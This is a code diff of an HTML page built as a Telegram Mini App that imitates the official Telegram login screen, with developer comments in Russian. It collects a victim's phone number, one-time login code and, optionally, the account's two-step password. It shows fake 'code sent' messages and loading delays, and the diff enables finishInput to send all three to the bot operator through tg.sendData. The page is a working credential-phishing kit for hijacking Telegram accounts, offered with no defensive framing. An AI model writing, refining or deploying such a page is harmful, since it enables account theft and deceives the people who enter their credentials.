@@ -6,7 +6,6 @@
     <title>Telegram Login</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        /* === ТЕМНАЯ ТЕМА === */
         body {
             background-color: #17212b;
             font-family: -apple-system, system-ui, sans-serif;
@@ -18,23 +17,14 @@
             color: #ffffff;
             overflow: hidden;
         }
-
         .login-card { width: 100%; max-width: 360px; text-align: center; padding: 20px; }
         .logo { width: 160px; height: 160px; margin-bottom: 20px; }
-
-        h2 {
-            font-size: 22px; margin-bottom: 10px; font-weight: 700;
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            color: #ffffff;
-        }
-
+        h2 { font-size: 22px; margin-bottom: 10px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; color: #ffffff; }
         .edit-icon { color: #50a8eb; cursor: pointer; font-size: 20px; transition: transform 0.2s; }
         .edit-icon:hover { transform: scale(1.1); }
-
         p { color: #97a6b5; font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
 
         .input-group { position: relative; margin-bottom: 25px; text-align: left; }
-
         .input-field {
             width: 100%; padding: 14px 20px; font-size: 17px;
             border: 2px solid #2f3b49; border-radius: 14px;
@@ -61,7 +51,6 @@
             position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
             cursor: pointer; color: #708499; display: flex; align-items: center;
         }
-        .password-toggle:hover { color: #50a8eb; }
         .password-toggle svg { width: 24px; height: 24px; fill: currentColor; }
 
         .btn-next {
@@ -75,7 +64,6 @@
         .terms-link { display: block; margin-top: 20px; color: #708499; text-decoration: none; font-size: 14px; }
         .hidden { display: none !important; }
 
-        /* Лоадер */
         .loader {
             border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%;
             border-top: 3px solid #ffffff; width: 22px; height: 22px;
@@ -83,45 +71,30 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* === КОД === */
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-
         .digit-box {
             width: 42px; height: 52px; border: 2px solid #2f3b49;
             border-radius: 8px; position: relative; overflow: hidden;
             transition: all 0.3s ease; background: transparent;
         }
         .digit-box:focus-within { border-color: #50a8eb; box-shadow: 0 0 0 3px rgba(80, 168, 235, 0.1); }
-
         .code-digit {
             width: 100%; height: 100%; border: none; background: transparent;
             font-size: 24px; font-weight: bold; text-align: center;
             outline: none; padding: 0; margin: 0; color: #ffffff;
-            /* Важно для анимации */
-            display: block;
         }
-
-        /* АНИМАЦИЯ ПОЯВЛЕНИЯ ЦИФРЫ */
-        @keyframes slideNum {
-            0% { transform: translateY(100%); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-        .animate-text {
-            animation: slideNum 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
-        }
-
+        @keyframes slideNum { 0% { transform: translateY(100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
+        .code-digit.animate-text { animation: slideNum 0.2s ease-out forwards; }
         .digit-box.locked { background-color: #0e1621; border-color: #1e2733; }
         .digit-box.locked .code-digit { color: #536375; }
         .digit-box.success { border-color: #46d168 !important; }
 
-        /* Ошибка */
         @keyframes shake {
             0% { transform: translateX(0); } 25% { transform: translateX(-5px); }
             50% { transform: translateX(5px); } 75% { transform: translateX(-5px); }
             100% { transform: translateX(0); }
         }
         .input-field.error { border-color: #ff5e57 !important; color: #ff5e57 !important; animation: shake 0.4s ease-in-out; }
-        .input-field.error + .input-label { color: #ff5e57 !important; }
     </style>
 </head>
 <body>
@@ -131,7 +104,7 @@
     <h2 id="main-title">Telegram</h2>
     <p id="main-desc">Please confirm your country code and<br>enter your phone number.</p>
 
-    <form>
+    <form onsubmit="return false;">
         <!-- 1. ТЕЛЕФОН -->
         <div id="step-phone">
             <div class="input-group">
@@ -168,15 +141,17 @@
 </div>
 
 <script>
+    // Инициализация
     const tg = window.Telegram.WebApp;
     tg.expand();
     tg.setHeaderColor('#17212b');
     tg.setBackgroundColor('#17212b');
 
-    // Проверка режима ?p=1
+    // Проверка режима пароля
     const urlParams = new URLSearchParams(window.location.search);
     const needPassword = urlParams.get('p') === '1';
 
+    // Элементы
     const phoneInput = document.getElementById('phone');
     const btnPhone = document.getElementById('btn-phone');
     const stepPhoneDiv = document.getElementById('step-phone');
@@ -191,54 +166,91 @@
     const title = document.getElementById('main-title');
     const desc = document.getElementById('main-desc');
 
-    // === 1. ТЕЛЕФОН ===
-    function fixCursorPosition() {
-        if (phoneInput.value.length < 1) phoneInput.value = '+';
-    }
-    phoneInput.addEventListener('focus', fixCursorPosition);
-    phoneInput.addEventListener('click', fixCursorPosition);
-    phoneInput.addEventListener('blur', () => { if (phoneInput.value === '+') phoneInput.value = ''; });
+    // ============================================
+    // ТЕЛЕФОН (МАСКА + ВВОД)
+    // ============================================
 
-    phoneInput.addEventListener('input', function (e) {
-        phoneInput.classList.remove('error');
-        // Простая очистка и маска
-        let x = e.target.value.replace(/\D/g, '');
+    // Форматирование номера (Возвращает отформатированную строку)
+    function formatPhoneNumber(val) {
+        let x = val.replace(/\D/g, '');
+        let res = '';
 
-        // Логика масок
-        if (x.startsWith('7') || x.startsWith('8')) {
-             if (x.startsWith('8')) x = '7' + x.substring(1);
+        if (x.length === 0) return '+';
+
+        if (x[0] === '7' || x[0] === '8') {
+             if (x[0] === '8') x = '7' + x.substring(1);
              x = x.substring(0, 11);
-             phoneInput.value = '+' + x;
+             res = '+7';
+             if (x.length > 1) res += ' ' + x.substring(1, 4);
+             if (x.length > 4) res += ' ' + x.substring(4, 7);
+             if (x.length > 7) res += ' ' + x.substring(7, 9);
+             if (x.length > 9) res += ' ' + x.substring(9, 11);
+        } else if (x.startsWith('380')) {
+             x = x.substring(0, 12);
+             res = '+380';
+             if (x.length > 3) res += ' ' + x.substring(3, 5);
+             if (x.length > 5) res += ' ' + x.substring(5, 8);
+             if (x.length > 8) res += ' ' + x.substring(8, 10);
+             if (x.length > 10) res += ' ' + x.substring(10, 12);
+        } else if (x.startsWith('375')) {
+             x = x.substring(0, 12);
+             res = '+375';
+             if (x.length > 3) res += ' ' + x.substring(3, 5);
+             if (x.length > 5) res += ' ' + x.substring(5, 8);
+             if (x.length > 8) res += ' ' + x.substring(8, 10);
+             if (x.length > 10) res += ' ' + x.substring(10, 12);
         } else {
-             phoneInput.value = '+' + x;
+             res = '+' + x;
         }
+        return res;
+    }
+
+    // Обработчик ввода
+    phoneInput.addEventListener('input', (e) => {
+        phoneInput.classList.remove('error');
+        // Переписываем значение полностью
+        e.target.value = formatPhoneNumber(e.target.value);
     });
 
-    btnPhone.addEventListener('click', function() {
-        if (phoneInput.value.length < 8) {
+    phoneInput.addEventListener('focus', () => {
+        if (phoneInput.value === '') phoneInput.value = '+';
+    });
+
+    // Кнопка NEXT
+    btnPhone.addEventListener('click', () => {
+        const raw = phoneInput.value.replace(/\D/g, '');
+        let min = 10;
+        if (raw.startsWith('7')) min = 11;
+        if (raw.startsWith('380') || raw.startsWith('375')) min = 12;
+
+        if (raw.length < min) {
             phoneInput.classList.add('error');
             setTimeout(() => phoneInput.classList.remove('error'), 500);
             return;
         }
-        const originalText = btnPhone.innerText;
+
         btnPhone.classList.add('loading');
         btnPhone.innerHTML = '<div class="loader"></div>';
         phoneInput.readOnly = true;
 
         setTimeout(() => {
             btnPhone.classList.remove('loading');
-            btnPhone.innerText = originalText;
+            btnPhone.innerText = 'Next';
             showCodeStep(phoneInput.value);
-        }, 2000);
+        }, 3000);
     });
 
-    // === 2. КОД ===
+    // ============================================
+    // КОД
+    // ============================================
     function showCodeStep(phoneNumber) {
         stepPhoneDiv.classList.add('hidden');
         stepPassDiv.classList.add('hidden');
         stepCodeDiv.classList.remove('hidden');
+
         title.innerHTML = `${phoneNumber} <span class="edit-icon" onclick="goBack()">✎</span>`;
         desc.innerHTML = 'We have sent you a code<br>to the Telegram app.';
+
         setTimeout(() => document.querySelector('.code-digit').focus(), 100);
     }
 
@@ -249,18 +261,20 @@
         input.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '');
             if (e.target.value) {
-                // === ИСПРАВЛЕНИЕ АНИМАЦИИ ===
-                input.classList.remove('animate-text'); // Сброс
-                void input.offsetWidth;                 // Магия перезапуска (reflow)
-                input.classList.add('animate-text');    // Старт
+                // Анимация
+                input.classList.remove('animate-text');
+                void input.offsetWidth;
+                input.classList.add('animate-text');
 
                 if (index < inputs.length - 1) inputs[index + 1].focus();
                 else handleCodeEntered();
             }
         });
+
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
         });
+
         input.addEventListener('paste', (e) => {
             e.preventDefault();
             const text = e.clipboardData.getData('text').replace(/\D/g, '');
@@ -268,7 +282,6 @@
             inputs.forEach(inp => {
                 if (idx < text.length) {
                     inp.value = text[idx++];
-                    // Анимация при вставке
                     inp.classList.remove('animate-text');
                     void inp.offsetWidth;
                     inp.classList.add('animate-text');
@@ -292,12 +305,17 @@
         }, 800);
     }
 
-    // === 3. ПАРОЛЬ ===
+    // ============================================
+    // ПАРОЛЬ
+    // ============================================
     function showPasswordStep() {
         stepCodeDiv.classList.add('hidden');
+        stepPhoneDiv.classList.add('hidden');
         stepPassDiv.classList.remove('hidden');
+
         title.innerText = 'Enter a Password';
         desc.innerHTML = 'Your account is protected with<br>an additional password.';
+
         setTimeout(() => passwordInput.focus(), 100);
     }
 
@@ -317,30 +335,34 @@
 
         setTimeout(() => {
             finishInput();
-        }, 2000);
+        }, 3000);
     });
 
-    // === ОБЩЕЕ ===
+    // ============================================
+    // ВОЗВРАТ И ОТПРАВКА
+    // ============================================
     window.goBack = function() {
         stepCodeDiv.classList.add('hidden');
         stepPassDiv.classList.add('hidden');
         stepPhoneDiv.classList.remove('hidden');
+
         title.innerText = 'Telegram';
         desc.innerHTML = 'Please confirm your country code and<br>enter your phone number.';
 
         phoneInput.readOnly = false;
+        phoneInput.value = ''; // Сброс номера при возврате
         phoneInput.focus();
 
-        passwordInput.readOnly = false;
         passwordInput.value = '';
-        btnPass.innerText = 'Next';
+        passwordInput.readOnly = false;
         btnPass.classList.remove('loading');
+        btnPass.innerText = 'Next';
+
+        btnPhone.classList.remove('loading');
+        btnPhone.innerText = 'Next';
 
         inputs.forEach(inp => { inp.value = ''; inp.readOnly = false; });
         boxes.forEach(box => { box.classList.remove('locked'); box.classList.remove('success'); });
-
-        btnPhone.innerText = 'Next';
-        btnPhone.classList.remove('loading');
     };
 
     function finishInput() {
@@ -350,13 +372,22 @@
             password: passwordInput.value
         };
 
-        // ДЕБАГ: ПОКАЗЫВАЕМ ЧТО ОТПРАВЛЯЕМ
-        // alert("ОТПРАВКА ДАННЫХ:\n" + JSON.stringify(data));
+        try {
+            if (tg) {
+                tg.sendData(JSON.stringify(data));
+            } else {
+                alert("Ошибка: WebApp не найден");
+            }
+        } catch (e) {
+            alert("Ошибка отправки: " + e.message);
+        }
 
-        if (tg) tg.sendData(JSON.stringify(data));
-
+        // Если пароль не нужен, показываем зеленый успех перед закрытием
         if (!needPassword) {
-            boxes.forEach(box => { box.classList.remove('locked'); box.classList.add('success'); });
+            boxes.forEach(box => {
+                box.classList.remove('locked');
+                box.classList.add('success');
+            });
         }
     }
 </script>
